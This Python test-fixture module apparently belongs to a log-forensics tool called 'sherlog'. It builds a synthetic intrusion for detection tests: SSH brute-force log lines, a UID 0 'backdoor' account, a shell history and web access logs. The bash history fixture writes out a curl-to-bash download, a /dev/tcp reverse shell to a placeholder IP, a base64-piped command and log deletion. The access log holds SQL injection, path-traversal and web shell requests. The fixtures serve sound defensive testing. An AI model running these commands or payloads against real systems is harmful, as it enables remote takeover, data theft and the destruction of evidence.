"""Builders for binary fixtures (utmp/wtmp/btmp, lastlog, journald)."""

from __future__ import annotations

import ipaddress
import os
import shutil
from datetime import UTC, datetime
from pathlib import Path

from sherlog.parsers.utmp import LASTLOG, UTMP

FIXTURES = Path(__file__).parent / "fixtures" / "logs"


def utmp_record(
    ut_type: int,
    *,
    user: str = "",
    line: str = "",
    host: str = "",
    ip: str | None = None,
    ts: int = 1714557600,
    pid: int = 1234,
) -> bytes:
    """One 384-byte glibc ``struct utmp`` record."""
    addr = b"\0" * 16
    if ip:
        packed = ipaddress.ip_address(ip).packed
        addr = packed + b"\0" * (16 - len(packed))
    return UTMP.pack(
        ut_type,
        pid,
        line.encode(),
        b"ts/0",
        user.encode(),
        host.encode(),
        0,
        0,
        0,
        ts,
        0,
        addr,
        b"\0" * 20,
    )


def lastlog_file(path: Path, entries: dict[int, tuple[int, str, str]]) -> Path:
    """Write a sparse lastlog: {uid: (epoch, line, host)}."""
    with path.open("wb") as fh:
        for uid in range(max(entries) + 1):
            sec, line, host = entries.get(uid, (0, "", ""))
            fh.write(LASTLOG.pack(sec, line.encode(), host.encode()))
    return path


def copy_fixture(name: str, dest: Path, mtime: datetime | None = None) -> Path:
    """Copy a text fixture, optionally setting its mtime (drives syslog year inference)."""
    dest.parent.mkdir(parents=True, exist_ok=True)
    shutil.copyfile(FIXTURES / name, dest)
    if mtime:
        ts = mtime.astimezone(UTC).timestamp()
        os.utime(dest, (ts, ts))
    return dest


# Timestamps use ISO format with an offset so no year inference is needed.
BRUTE_IP = "203.0.113.50"
# scanme.nmap.org: a public address the Nmap project provides for testing.
PUBLIC_IP = "45.33.32.156"


def auth_log(path: Path, ip: str = BRUTE_IP) -> None:
    """12 SSH failures then a success from one IP (brute force + success-after-failures)."""
    lines = []
    for i in range(12):
        ts = datetime(2024, 5, 1, 2, 0, i * 5, tzinfo=UTC)
        lines.append(
            f"{ts.isoformat()} web01 sshd[{1000 + i}]: Failed password for root "
            f"from {ip} port {40000 + i} ssh2"
        )
    ok = datetime(2024, 5, 1, 2, 1, 5, tzinfo=UTC)
    lines.append(
        f"{ok.isoformat()} web01 sshd[2000]: Accepted password for root from {ip} port 40100 ssh2"
    )
    # New UID 0 account + add to sudo.
    t2 = datetime(2024, 5, 1, 2, 2, 0, tzinfo=UTC)
    lines.append(
        f"{t2.isoformat()} web01 useradd[2100]: new user: name=backdoor, UID=0, GID=0, "
        "home=/root, shell=/bin/bash, from=/dev/pts/0"
    )
    lines.append(f"{t2.isoformat()} web01 usermod[2101]: add 'backdoor' to group 'sudo'")
    path.write_text("\n".join(lines) + "\n")


def bash_history(path: Path) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(
        "\n".join(
            [
                "ls -la",
                "curl -s http://198.51.100.20/x.sh | bash",
                "bash -i >& /dev/tcp/198.51.100.20/4444 0>&1",
                "echo ZWNobyBwd25lZAo= | base64 -d | sh",
                "rm -rf /var/log/auth.log",
                "history -c",
            ]
        )
        + "\n"
    )


def access_log(path: Path, ip: str = BRUTE_IP) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    rows = [
        f'{ip} - - [01/May/2024:02:05:00 +0000] "GET /p?id=1 UNION SELECT password FROM users HTTP/1.1" 200 512 "-" "sqlmap/1.7"',  # noqa: E501
        f'{ip} - - [01/May/2024:02:05:01 +0000] "GET /p?f=../../../../etc/passwd HTTP/1.1" 200 2048 "-" "curl/8"',  # noqa: E501
        f'{ip} - - [01/May/2024:02:05:02 +0000] "GET /uploads/shell.php?cmd=id HTTP/1.1" 200 40 "-" "curl/8"',  # noqa: E501
    ]
    path.write_text("\n".join(rows) + "\n")


def build_incident(root: Path, ip: str = BRUTE_IP) -> Path:
    """A crafted incident: SSH brute force + backdoor account, shell history, web attacks, audit."""
    (root / "var/log").mkdir(parents=True)
    auth_log(root / "var/log/auth.log", ip)
    bash_history(root / "home/deploy/.bash_history")
    access_log(root / "var/log/apache2/access.log", ip)
    copy_fixture("audit.log", root / "var/log/audit/audit.log")
    return root
